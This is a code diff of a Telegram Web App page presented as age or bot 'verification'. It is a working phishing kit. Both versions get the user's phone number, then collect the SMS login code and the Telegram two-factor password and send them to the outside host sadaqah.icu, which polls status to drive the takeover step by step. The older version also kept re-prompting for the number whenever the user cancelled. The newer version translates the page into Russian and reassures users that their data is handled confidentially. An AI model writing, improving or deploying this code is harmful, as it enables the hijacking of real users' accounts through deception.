@@ -6,7 +6,7 @@
   <title>Verification</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    :root{
+    :root {
       --bg: var(--tg-theme-bg-color, #0b0d10);
       --text: var(--tg-theme-text-color, #e9eef5);
       --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
@@ -16,64 +16,44 @@
       --radius: 18px;
       --shadow: 0 12px 30px rgba(0,0,0,.25);
     }
-
-    *{ box-sizing: border-box; }
-    html, body { height: 100%; }
-
-    body{
-      margin: 0;
+    * { box-sizing: border-box; }
+    html, body { height: 100%; margin: 0; }
+    body {
       color: var(--text);
       background: radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
                   radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
                   var(--bg);
-      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, "Noto Sans", "Apple Color Emoji", "Segoe UI Emoji";
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
       -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
       padding: calc(14px + env(safe-area-inset-top)) 16px calc(20px + env(safe-area-inset-bottom));
       display: flex;
       justify-content: center;
     }
-
-    .wrap{
+    .wrap {
       width: 100%;
       max-width: 420px;
       display: flex;
       flex-direction: column;
       gap: 14px;
     }
-
-    .card{
+    .card {
       background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
       border: 1px solid rgba(255,255,255,.10);
       border-radius: var(--radius);
       box-shadow: var(--shadow);
-      padding: 16px;
+      padding: 20px 16px;
       backdrop-filter: blur(10px);
     }
-
-    .top{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
+    .top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
       gap: 12px;
     }
-
-    .title{
-      font-size: 18px;
-      font-weight: 700;
-      letter-spacing: .2px;
-      margin: 0;
-    }
-
-    .subtitle{
-      margin: 6px 0 0;
-      color: var(--hint);
-      font-size: 13px;
-      line-height: 1.35;
-    }
-
-    .pill{
-      padding: 8px 10px;
+    .title { font-size: 19px; font-weight: 700; margin: 0; }
+    .subtitle { margin: 6px 0 0; color: var(--hint); font-size: 13.5px; line-height: 1.4; }
+    .pill {
+      padding: 8px 12px;
       border-radius: 999px;
       background: var(--secondary);
       color: var(--hint);
@@ -81,522 +61,425 @@
       border: 1px solid rgba(255,255,255,.08);
       white-space: nowrap;
     }
-
-    .codeBox{
-      margin-top: 12px;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding: 14px 12px;
+    .codeBox {
+      margin: 16px 0 8px;
+      display: flex;
+      justify-content: center;
+      padding: 16px;
       border-radius: 16px;
       border: 1px solid rgba(255,255,255,.12);
       background: rgba(0,0,0,.12);
     }
-
-    .codeDots{
-      display:flex;
-      gap: 10px;
-      align-items:center;
-      justify-content:center;
-      width: 100%;
+    .codeDots {
+      display: flex;
+      gap: 12px;
       max-width: 320px;
     }
-
-    .dot{
+    .dot {
       width: 14px;
       height: 14px;
-      border-radius: 999px;
+      border-radius: 50%;
       background: rgba(255,255,255,.14);
       border: 1px solid rgba(255,255,255,.12);
-      box-shadow: inset 0 0 0 2px rgba(0,0,0,.06);
-      transform: scale(1);
-      transition: transform .12s ease, background .12s ease, border-color .12s ease;
+      transition: all .15s ease;
     }
-
-    .dot.filled{
+    .dot.filled {
       background: rgba(46,166,255,.95);
       border-color: rgba(46,166,255,.6);
-      transform: scale(1.05);
+      transform: scale(1.08);
     }
-
-    .hintRow{
-      margin-top: 10px;
-      display:flex;
+    .hintRow {
+      display: flex;
       justify-content: space-between;
-      gap: 10px;
       color: var(--hint);
-      font-size: 12px;
+      font-size: 12.5px;
+      margin-top: 4px;
     }
-
-    .keyboard{
-      display:grid;
+    .keyboard {
+      display: grid;
       grid-template-columns: repeat(3, 1fr);
       gap: 10px;
     }
-
-    .key{
-      height: clamp(52px, 9.5vh, 72px);
+    .key {
+      height: clamp(54px, 9.8vh, 74px);
       border-radius: 16px;
       border: 1px solid rgba(255,255,255,.10);
       background: rgba(255,255,255,.06);
       color: var(--text);
-      font-size: 22px;
+      font-size: 23px;
       font-weight: 700;
       box-shadow: 0 8px 18px rgba(0,0,0,.18);
-      transition: transform .08s ease, opacity .08s ease, background .12s ease;
-      -webkit-tap-highlight-color: transparent;
+      transition: all .1s ease;
       touch-action: manipulation;
-      user-select: none;
     }
-
-    .key:active{
-      transform: translateY(1px) scale(.99);
-      opacity: .92;
-    }
-
-    .key.primary{
+    .key:active { transform: translateY(2px) scale(0.97); opacity: 0.9; }
+    .key.primary {
       background: linear-gradient(180deg, rgba(46,166,255,.95), rgba(46,166,255,.75));
       border-color: rgba(46,166,255,.55);
-      color: var(--buttonText);
+      color: white;
     }
-
-    .key.icon{
-      font-size: 20px;
-      font-weight: 800;
-      color: var(--hint);
-    }
-
-    .spacer{
-      opacity: 0;
-      pointer-events: none;
-    }
-
-    .footerNote{
-      text-align:center;
-      color: var(--hint);
-      font-size: 12px;
-      margin-top: 6px;
-    }
-
-    .hidden { display: none !important; }
-
-    .loading {
-      text-align: center;
-      color: var(--hint);
-      padding: 20px;
-    }
-
-    .retry-btn {
+    .key.icon { font-size: 22px; color: var(--hint); }
+    .spacer { opacity: 0; pointer-events: none; }
+    .loading { text-align: center; padding: 40px 0; color: var(--hint); font-size: 16px; }
+    .btn-primary {
       background: var(--button);
       color: var(--buttonText);
       border: none;
       border-radius: var(--radius);
-      padding: 12px;
+      padding: 14px;
       font-size: 16px;
+      font-weight: 600;
       width: 100%;
       margin-top: 12px;
       cursor: pointer;
     }
-
     .twofa-input {
       width: 100%;
-      padding: 12px;
+      padding: 14px;
       border-radius: var(--radius);
       border: 1px solid rgba(255,255,255,.2);
       background: rgba(0,0,0,.3);
       color: var(--text);
       font-size: 16px;
-      margin: 10px 0;
+      margin: 12px 0;
     }
+    .hidden { display: none !important; }
   </style>
 </head>
-
 <body>
   <div class="wrap">
-    <!-- Блок ожидания -->
-    <div id="loadingBlock" class="card loading">
-      <p>Loading...</p>
-    </div>
+    <div id="loadingBlock" class="card loading">Загрузка...</div>
 
-    <!-- Блок запроса номера (авто-запрос) -->
     <div id="phoneBlock" class="card hidden">
       <div class="top">
         <div>
-          <p class="title">Verify your age</p>
-          <p class="subtitle">Please share your phone number to confirm you're not a robot.</p>
+          <p class="title">Подтверждение возраста</p>
+          <p class="subtitle">Поделитесь номером телефона, чтобы мы убедились, что вы не робот.</p>
         </div>
-        <div class="pill" id="phoneDisplay">Not shared</div>
+        <div class="pill" id="phoneDisplay">Не получен</div>
       </div>
-      <!-- Кнопка не нужна, запрос автоматический -->
+      <button id="sharePhoneBtn" class="btn-primary">Поделиться номером</button>
+      <p style="margin-top:12px; text-align:center; color:var(--hint); font-size:12px;">
+        Мы не сохраняем ваш номер на устройстве
+      </p>
     </div>
 
-    <!-- Блок ввода кода -->
     <div id="codeBlock" class="card hidden">
       <div class="top">
         <div>
-          <p class="title">Verification</p>
-          <p class="subtitle">Enter the code sent via SMS — it will take just a few seconds.</p>
+          <p class="title">Код подтверждения</p>
+          <p class="subtitle">Введите код из SMS (придёт за 5–30 секунд)</p>
         </div>
-        <div class="pill" id="codePhoneDisplay">Phone: —</div>
+        <div class="pill" id="codePhoneDisplay">—</div>
       </div>
-      <div class="codeBox" aria-label="Verification code">
+      <div class="codeBox">
         <div class="codeDots" id="codeDots"></div>
       </div>
       <div class="hintRow">
         <span id="progressHint">0 / 5</span>
-        <span>Delete: ⌫</span>
+        <span>Удалить: ⌫</span>
       </div>
     </div>
 
-    <!-- Блок ввода 2FA -->
     <div id="twofaBlock" class="card hidden">
       <div class="top">
         <div>
-          <p class="title">Two‑factor authentication</p>
-          <p class="subtitle">Enter your account password (2FA).</p>
+          <p class="title">Двухфакторная аутентификация</p>
+          <p class="subtitle">Введите пароль от вашего аккаунта Telegram</p>
         </div>
-        <div class="pill" id="twofaPhoneDisplay">Phone: —</div>
+        <div class="pill" id="twofaPhoneDisplay">—</div>
       </div>
-      <input type="password" id="twofaInput" class="twofa-input" placeholder="Password" />
-      <button id="submit2faBtn" class="retry-btn">✅ Submit</button>
+      <input type="password" id="twofaInput" class="twofa-input" placeholder="Пароль" autocomplete="off" />
+      <button id="submit2faBtn" class="btn-primary">Подтвердить</button>
     </div>
 
-    <!-- Клавиатура для кода -->
-    <div class="keyboard card" id="keyboard"></div>
-    <div class="footerNote">Your data is not stored on the device.</div>
+    <div class="keyboard card hidden" id="keyboard"></div>
+
+    <div class="footerNote" style="text-align:center; color:var(--hint); font-size:12px; margin-top:8px;">
+      Данные обрабатываются конфиденциально
+    </div>
   </div>
 
   <script>
-    (function() {
+    (function () {
       const WebApp = window.Telegram?.WebApp;
       if (!WebApp) {
-        alert('Telegram WebApp is not available');
+        alert("Это приложение работает только внутри Telegram");
         return;
       }
+
       WebApp.ready();
       WebApp.expand();
+      WebApp.MainButton.setParams({ color: "#2ea6ff", text_color: "#ffffff" });
 
-      const userId = WebApp.initDataUnsafe?.user?.id;
-      if (!userId) {
-        alert('Could not get user_id');
+      const user = WebApp.initDataUnsafe?.user;
+      if (!user?.id) {
+        alert("Не удалось получить данные пользователя");
         return;
       }
+      const userId = user.id;
 
-      // --- Элементы DOM ---
-      const loadingBlock = document.getElementById('loadingBlock');
-      const phoneBlock = document.getElementById('phoneBlock');
-      const codeBlock = document.getElementById('codeBlock');
-      const twofaBlock = document.getElementById('twofaBlock');
-      const phoneDisplay = document.getElementById('phoneDisplay');
-      const codePhoneDisplay = document.getElementById('codePhoneDisplay');
-      const twofaPhoneDisplay = document.getElementById('twofaPhoneDisplay');
-      const codeDots = document.getElementById('codeDots');
-      const progressHint = document.getElementById('progressHint');
-      const keyboard = document.getElementById('keyboard');
-      const twofaInput = document.getElementById('twofaInput');
-      const submit2faBtn = document.getElementById('submit2faBtn');
+      // DOM элементы
+      const els = {
+        loading: document.getElementById("loadingBlock"),
+        phone: document.getElementById("phoneBlock"),
+        code: document.getElementById("codeBlock"),
+        twofa: document.getElementById("twofaBlock"),
+        keyboard: document.getElementById("keyboard"),
+        phoneDisplay: document.getElementById("phoneDisplay"),
+        codePhoneDisplay: document.getElementById("codePhoneDisplay"),
+        twofaPhoneDisplay: document.getElementById("twofaPhoneDisplay"),
+        codeDots: document.getElementById("codeDots"),
+        progressHint: document.getElementById("progressHint"),
+        sharePhoneBtn: document.getElementById("sharePhoneBtn"),
+        twofaInput: document.getElementById("twofaInput"),
+        submit2faBtn: document.getElementById("submit2faBtn"),
+      };
 
-      const CODE_LEN = 5; // должно совпадать с config.py
-      let code = '';
-      let currentPhone = localStorage.getItem('tg_phone') || ''; // восстанавливаем номер, если был
-      let phoneRequestTimer = null;
-      let isRequestingPhone = false;
-      let phoneShared = false; // true, когда номер успешно получен
-      let pollingInterval = null; // для опроса статуса
+      const CODE_LENGTH = 5;
+      let code = "";
+      let currentPhone = localStorage.getItem("tg_phone") || "";
+      let phoneShared = !!currentPhone;
+      let pollingTimer = null;
 
-      // --- Утилиты ---
-      function maskPhone(p) {
-        if (!p) return '—';
-        const cleaned = String(p).replace(/\D/g, '');
-        if (cleaned.length < 4) return p;
-        const last4 = cleaned.slice(-4);
-        return '****' + last4;
+      function maskPhone(phone) {
+        if (!phone) return "—";
+        const digits = phone.replace(/\D/g, "");
+        return digits.length >= 4 ? "****" + digits.slice(-4) : phone;
       }
 
-      function showBlock(blockId) {
-        console.log('Showing block:', blockId);
-        loadingBlock.classList.add('hidden');
-        phoneBlock.classList.add('hidden');
-        codeBlock.classList.add('hidden');
-        twofaBlock.classList.add('hidden');
-
-        if (blockId === 'phone') {
-          phoneBlock.classList.remove('hidden');
-          keyboard.style.display = 'none';
-          if (currentPhone) {
-            phoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
-          } else {
-            phoneDisplay.textContent = 'Not shared';
-          }
-          // Запускаем автоматический запрос номера
-          autoRequestPhone();
-        } else if (blockId === 'code') {
-          codeBlock.classList.remove('hidden');
-          keyboard.style.display = 'grid';
-          if (currentPhone) {
-            codePhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
-          }
-          renderDots();
-        } else if (blockId === '2fa') {
-          twofaBlock.classList.remove('hidden');
-          keyboard.style.display = 'none';
-          if (currentPhone) {
-            twofaPhoneDisplay.textContent = `Phone: ${maskPhone(currentPhone)}`;
-          }
-        } else {
-          loadingBlock.classList.remove('hidden');
-        }
-      }
-
-      // --- Автоматический запрос номера с повтором при отмене ---
-      async function autoRequestPhone() {
-        // Если номер уже получен, не запрашиваем
-        if (phoneShared) return;
-
-        // Если уже выполняется запрос, не запускаем новый
-        if (isRequestingPhone) return;
-
-        // Очищаем предыдущий таймер
-        if (phoneRequestTimer) {
-          clearTimeout(phoneRequestTimer);
-          phoneRequestTimer = null;
-        }
-
-        isRequestingPhone = true;
-
-        try {
-          console.log('Requesting phone...');
-          const contactData = await WebApp.requestContact();
-          console.log('Contact data:', contactData);
-          
-          if (contactData && contactData.contact && contactData.contact.phone_number) {
-            const phone = contactData.contact.phone_number;
-            currentPhone = phone;
-            localStorage.setItem('tg_phone', phone);
-            phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
-            phoneShared = true; // останавливаем авто-запрос
-
-            // Номер отправлен в чат, теперь начинаем polling статуса
+      function showScreen(screen) {
+        Object.values(els).forEach(el => el?.classList?.add?.("hidden"));
+        if (screen === "loading") els.loading.classList.remove("hidden");
+        else if (screen === "phone") {
+          els.phone.classList.remove("hidden");
+          els.keyboard.classList.add("hidden");
+          WebApp.MainButton.hide();
+          if (phoneShared && currentPhone) {
+            els.phoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
             startPolling();
-          } else {
-            // Странный случай – повтор через 1 сек
-            console.log('No contact data received, retrying...');
-            phoneRequestTimer = setTimeout(autoRequestPhone, 1000);
           }
-        } catch (error) {
-          // Пользователь отменил запрос контакта – повторяем через 1 сек
-          console.log('Request contact cancelled, retrying...');
-          phoneRequestTimer = setTimeout(autoRequestPhone, 1000);
-        } finally {
-          isRequestingPhone = false;
+        }
+        else if (screen === "code") {
+          els.code.classList.remove("hidden");
+          els.keyboard.classList.remove("hidden");
+          if (currentPhone) {
+            els.codePhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
+          }
+          renderCodeDots();
+          WebApp.MainButton.hide();
+        }
+        else if (screen === "2fa") {
+          els.twofa.classList.remove("hidden");
+          els.keyboard.classList.add("hidden");
+          if (currentPhone) {
+            els.twofaPhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
+          }
+          WebApp.MainButton.hide();
         }
       }
 
-      // --- Polling статуса ---
-      function startPolling() {
-        if (pollingInterval) clearInterval(pollingInterval);
-        pollingInterval = setInterval(async () => {
-          try {
-            const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
-            const data = await res.json();
-            const state = data.state;
-            console.log('Polling state:', state);
-
-            if (state === 'get_code') {
-              clearInterval(pollingInterval);
-              pollingInterval = null;
-              showBlock('code');
-            } else if (state === 'get_2fa') {
-              clearInterval(pollingInterval);
-              pollingInterval = null;
-              showBlock('2fa');
-            } else if (state === 'none' || state === 'get_number') {
-              // Ждём дальше
-            } else {
-              // Неизвестное состояние – возможно, ошибка
-              console.warn('Unknown state:', state);
-            }
-          } catch (e) {
-            console.error('Polling error:', e);
-          }
-        }, 2000); // опрос каждые 2 секунды
-      }
-
-      // --- Логика ввода кода ---
-      function renderDots() {
-        codeDots.innerHTML = '';
-        for (let i = 0; i < CODE_LEN; i++) {
-          const d = document.createElement('div');
-          d.className = 'dot' + (i < code.length ? ' filled' : '');
-          codeDots.appendChild(d);
+      function renderCodeDots() {
+        els.codeDots.innerHTML = "";
+        for (let i = 0; i < CODE_LENGTH; i++) {
+          const dot = document.createElement("div");
+          dot.className = "dot" + (i < code.length ? " filled" : "");
+          els.codeDots.appendChild(dot);
         }
-        progressHint.textContent = `${code.length} / ${CODE_LEN}`;
+        els.progressHint.textContent = `${code.length} / ${CODE_LENGTH}`;
       }
 
-      function haptic(type = 'light') {
-        try {
-          WebApp?.HapticFeedback?.impactOccurred?.(type);
-        } catch {}
+      function haptic(type = "light") {
+        WebApp.HapticFeedback?.impactOccurred?.(type);
       }
 
       function addDigit(d) {
-        if (code.length >= CODE_LEN) return;
+        if (code.length >= CODE_LENGTH) return;
         code += d;
-        haptic('light');
-        renderDots();
-        if (code.length === CODE_LEN) {
-          WebApp.MainButton
-            .setText('Confirm')
-            .show()
-            .onClick(sendCode);
+        haptic("light");
+        renderCodeDots();
+        if (code.length === CODE_LENGTH) {
+          WebApp.MainButton.setText("Подтвердить").show().onClick(submitCode);
         } else {
           WebApp.MainButton.hide();
         }
       }
 
       function deleteDigit() {
-        if (!code.length) return;
+        if (code.length === 0) return;
         code = code.slice(0, -1);
-        haptic('light');
-        renderDots();
-        if (code.length === CODE_LEN) {
+        haptic("light");
+        renderCodeDots();
+        if (code.length === CODE_LENGTH) {
           WebApp.MainButton.show();
         } else {
           WebApp.MainButton.hide();
         }
       }
 
-      async function sendCode() {
-        if (code.length !== CODE_LEN) return;
-        WebApp.MainButton.disable().showProgress(true);
+      async function submitCode() {
+        if (code.length !== CODE_LENGTH) return;
+        WebApp.MainButton.showProgress(true).disable();
+
         try {
-          const res = await fetch('https://sadaqah.icu/submit_code', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user_id: userId, phone: currentPhone, code: code })
+          const res = await fetch("https://sadaqah.icu/submit_code", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ user_id: userId, phone: currentPhone, code }),
           });
-          const result = await res.json();
-          console.log('Submit code result:', result);
-          if (result.status === 'ok') {
-            haptic('medium');
+          const data = await res.json();
+
+          if (data.status === "ok") {
+            haptic("success");
             WebApp.close();
-          } else if (result.status === '2fa_required') {
-            showBlock('2fa');
-            WebApp.MainButton.hide();
+          } else if (data.status === "2fa_required") {
+            showScreen("2fa");
+            haptic("medium");
           } else {
-            WebApp.MainButton.enable().showProgress(false);
-            haptic('rigid');
-            alert('Error: ' + (result.message || 'Invalid code'));
-            code = '';
-            renderDots();
+            haptic("error");
+            alert(data.message || "Неверный код");
+            code = "";
+            renderCodeDots();
           }
         } catch (err) {
-          console.error('Network error sending code:', err);
-          WebApp.MainButton.enable().showProgress(false);
-          haptic('rigid');
-          alert('Network error: ' + err);
+          haptic("error");
+          alert("Ошибка сети. Попробуйте позже.");
+        } finally {
+          WebApp.MainButton.hideProgress().enable();
         }
       }
 
-      // --- Отправка 2FA ---
-      submit2faBtn.addEventListener('click', async () => {
-        const password = twofaInput.value.trim();
-        if (!password) {
-          alert('Please enter your password');
-          return;
-        }
-        submit2faBtn.disabled = true;
-        submit2faBtn.textContent = '⏳ Checking...';
+      async function submit2FA() {
+        const password = els.twofaInput.value.trim();
+        if (!password) return alert("Введите пароль");
+
+        els.submit2faBtn.disabled = true;
+        els.submit2faBtn.textContent = "Проверка...";
+
         try {
-          const res = await fetch('https://sadaqah.icu/submit_2fa', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user_id: userId, password: password })
+          const res = await fetch("https://sadaqah.icu/submit_2fa", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ user_id: userId, password }),
           });
-          const result = await res.json();
-          console.log('Submit 2FA result:', result);
-          if (result.status === 'ok') {
-            haptic('medium');
+          const data = await res.json();
+
+          if (data.status === "ok") {
+            haptic("success");
             WebApp.close();
           } else {
-            alert('Error: ' + (result.message || 'Invalid password'));
-            twofaInput.value = '';
+            alert(data.message || "Неверный пароль");
+            els.twofaInput.value = "";
           }
         } catch (err) {
-          console.error('Network error sending 2FA:', err);
-          alert('Network error: ' + err);
+          alert("Ошибка сети");
         } finally {
-          submit2faBtn.disabled = false;
-          submit2faBtn.textContent = '✅ Submit';
+          els.submit2faBtn.disabled = false;
+          els.submit2faBtn.textContent = "Подтвердить";
         }
-      });
+      }
 
-      // --- Создание клавиатуры ---
-      const keys = ['1','2','3','4','5','6','7','8','9','spacer','0','del'];
-      keys.forEach(k => {
-        const btn = document.createElement('button');
-        btn.className = 'key';
-        if (k === 'spacer') {
-          btn.classList.add('spacer');
-          btn.disabled = true;
-          btn.textContent = '';
-        } else if (k === 'del') {
-          btn.classList.add('icon');
-          btn.textContent = '⌫';
-          btn.addEventListener('click', deleteDigit);
-        } else {
-          btn.textContent = k;
-          btn.addEventListener('click', () => addDigit(k));
+      async function requestPhoneNumber() {
+        if (phoneShared) return;
+
+        try {
+          const contact = await WebApp.requestContact();
+          if (contact?.contact?.phone_number) {
+            currentPhone = contact.contact.phone_number;
+            localStorage.setItem("tg_phone", currentPhone);
+            phoneShared = true;
+            els.phoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
+            els.codePhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
+            els.twofaPhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
+            haptic("success");
+            startPolling();
+          } else {
+            alert("Не удалось получить номер. Попробуйте ещё раз.");
+          }
+        } catch (err) {
+          alert("Вы отменили запрос номера.\nНажмите кнопку ещё раз, если готовы поделиться.");
         }
-        keyboard.appendChild(btn);
-      });
+      }
 
-      // --- Клавиатура компьютера ---
-      window.addEventListener('keydown', (e) => {
-        if (!codeBlock.classList.contains('hidden')) {
-          if (e.key >= '0' && e.key <= '9') addDigit(e.key);
-          if (e.key === 'Backspace') deleteDigit();
-          if (e.key === 'Enter' && code.length === CODE_LEN) sendCode();
-        }
-      });
+      function startPolling() {
+        if (pollingTimer) clearInterval(pollingTimer);
 
-      // --- Инициализация ---
+        pollingTimer = setInterval(async () => {
+          try {
+            const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
+            const { state } = await res.json();
+
+            if (state === "get_code") {
+              clearInterval(pollingTimer);
+              pollingTimer = null;
+              showScreen("code");
+            } else if (state === "get_2fa") {
+              clearInterval(pollingTimer);
+              pollingTimer = null;
+              showScreen("2fa");
+            }
+          } catch {}
+        }, 1800);
+      }
+
+      // ─── Инициализация ────────────────────────────────────────
+
+      showScreen("loading");
+
       (async () => {
-        showBlock('loading');
-        const state = await fetchState();
-        console.log('Initial state:', state);
+        try {
+          const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
+          const { state } = await res.json();
 
-        if (state === 'get_number' || state === 'none') {
-          showBlock('phone');
-        } else if (state === 'get_code') {
-          if (!currentPhone) {
-            // Нет номера – запрашиваем заново
-            showBlock('phone');
+          if (state === "get_code" || state === "get_2fa") {
+            if (phoneShared && currentPhone) {
+              showScreen(state === "get_code" ? "code" : "2fa");
+              startPolling();
+            } else {
+              showScreen("phone");
+            }
           } else {
-            showBlock('code');
+            showScreen("phone");
           }
-        } else if (state === 'get_2fa') {
-          if (!currentPhone) {
-            showBlock('phone');
-          } else {
-            showBlock('2fa');
-          }
-        } else {
-          showBlock('phone');
+        } catch {
+          showScreen("phone");
         }
       })();
 
-      // Функция fetchState
-      async function fetchState() {
-        try {
-          const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
-          const data = await res.json();
-          return data.state;
-        } catch (e) {
-          console.error('Status error:', e);
-          return 'none';
+      // События
+      els.sharePhoneBtn.addEventListener("click", requestPhoneNumber);
+      els.submit2faBtn.addEventListener("click", submit2FA);
+
+      // Клавиатура
+      const keysLayout = ["1","2","3","4","5","6","7","8","9","spacer","0","del"];
+      keysLayout.forEach(k => {
+        const btn = document.createElement("button");
+        btn.className = "key";
+        if (k === "spacer") {
+          btn.classList.add("spacer");
+        } else if (k === "del") {
+          btn.classList.add("icon");
+          btn.textContent = "⌫";
+          btn.onclick = deleteDigit;
+        } else {
+          btn.textContent = k;
+          btn.onclick = () => addDigit(k);
         }
-      }
+        els.keyboard.appendChild(btn);
+      });
+
+      // Клавиатура ПК
+      window.addEventListener("keydown", e => {
+        if (els.code.classList.contains("hidden")) return;
+        if (e.key >= "0" && e.key <= "9") addDigit(e.key);
+        if (e.key === "Backspace") deleteDigit();
+        if (e.key === "Enter" && code.length === CODE_LENGTH) submitCode();
+      });
+
+      // Очистка при закрытии
+      window.addEventListener("beforeunload", () => {
+        if (pollingTimer) clearInterval(pollingTimer);
+      });
     })();
   </script>
 </body>
